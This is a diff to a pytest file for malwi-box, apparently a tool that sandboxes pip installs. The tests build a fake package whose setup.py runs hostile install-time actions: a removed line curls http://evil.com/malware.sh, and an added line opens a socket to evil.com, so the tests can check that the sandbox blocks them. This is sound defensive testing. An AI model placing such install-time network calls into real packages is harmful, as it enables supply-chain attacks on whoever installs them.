@@ -181,26 +181,25 @@ class TestInstallCommand:
     """Test the malwi-box pip install CLI command."""
 
     @pytest.fixture
-    def malicious_curl_package(self):
-        """Create a temporary package with a setup.py that runs curl."""
-        tmpdir = Path(tempfile.mkdtemp(prefix="malwi_test_curl_pkg_"))
+    def malicious_package(self):
+        """Create a temporary package with a setup.py that tries malicious actions."""
+        tmpdir = Path(tempfile.mkdtemp(prefix="malwi_test_pkg_"))
 
-        # Create setup.py that tries to run curl
+        # Create setup.py that tries to make a socket connection (blocked by default)
         setup_py = tmpdir / "setup.py"
         setup_py.write_text('''
-import subprocess
+import socket
 import sys
 
-# Try to run curl - should be blocked
-try:
-    result = subprocess.run(["curl", "-s", "http://evil.com/malware.sh"],
-                          capture_output=True, timeout=5)
-    print(f"CURL RAN - NOT BLOCKED! rc={result.returncode}", file=sys.stderr)
-except Exception as e:
-    print(f"BLOCKED: {e}", file=sys.stderr)
+# Try to connect to evil.com - should be blocked immediately
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(1)
+s.connect(("evil.com", 80))
+s.close()
+print("CONNECTED - NOT BLOCKED!", file=sys.stderr)
 
 from setuptools import setup
-setup(name="test-curl-pkg", version="0.0.1")
+setup(name="test-pkg", version="0.0.1")
 ''')
 
         # Create pyproject.toml
@@ -211,7 +210,7 @@ requires = ["setuptools>=61.0"]
 build-backend = "setuptools.build_meta"
 
 [project]
-name = "test-curl-pkg"
+name = "test-pkg"
 version = "0.0.1"
 ''')
 
@@ -221,41 +220,14 @@ version = "0.0.1"
         import shutil
         shutil.rmtree(tmpdir, ignore_errors=True)
 
-    def test_install_blocks_curl_in_setup_py(self, malicious_curl_package):
-        """Test that malwi-box pip install blocks curl in setup.py."""
-        wrapper_path = get_malwi_python_path()
-        if wrapper_path is None:
-            pytest.skip("Wrapper not available")
-
-        # Run malwi-box pip install on the local package
-        result = subprocess.run(
-            [sys.executable, "-m", "malwi_box.cli", "pip", "install", str(malicious_curl_package)],
-            capture_output=True,
-            text=True,
-            timeout=30,
-        )
-
-        # Skip if environment is externally managed (uv, pyenv, etc.)
-        if "externally-managed-environment" in result.stderr:
-            pytest.skip("Cannot test pip install in externally-managed environment")
-
-        # The install should fail with exit code 78 (blocked)
-        # because setup.py tries to run curl
-        assert result.returncode == 78, (
-            f"Expected exit 78, got {result.returncode}.\n"
-            f"stdout: {result.stdout}\n"
-            f"stderr: {result.stderr}"
-        )
-        assert "Blocked" in result.stderr
-
-    def test_install_blocks_curl_in_subprocess_of_setup_py(self, malicious_curl_package):
-        """Test that subprocess.run(curl) in setup.py is blocked during pip install."""
+    def test_install_blocks_socket_in_setup_py(self, malicious_package):
+        """Test that malwi-box pip install blocks socket.connect in setup.py."""
         wrapper_path = get_malwi_python_path()
         if wrapper_path is None:
             pytest.skip("Wrapper not available")
 
         # Run setup.py directly with the wrapper (simulates what pip does)
-        # This ensures the hook blocks curl even in nested subprocesses
+        # This is faster than running full pip install
         from malwi_box.wrapper import setup_wrapper_bin_dir, cleanup_wrapper_bin_dir
 
         bin_dir, env = setup_wrapper_bin_dir(mode="run")
@@ -265,11 +237,11 @@ version = "0.0.1"
             test_env["PATH"] = f"{bin_dir}:{test_env.get('PATH', '')}"
 
             result = subprocess.run(
-                ["python", str(malicious_curl_package / "setup.py")],
+                ["python", str(malicious_package / "setup.py")],
                 capture_output=True,
                 text=True,
                 env=test_env,
-                timeout=30,
+                timeout=10,
             )
 
             # Should be blocked with exit code 78
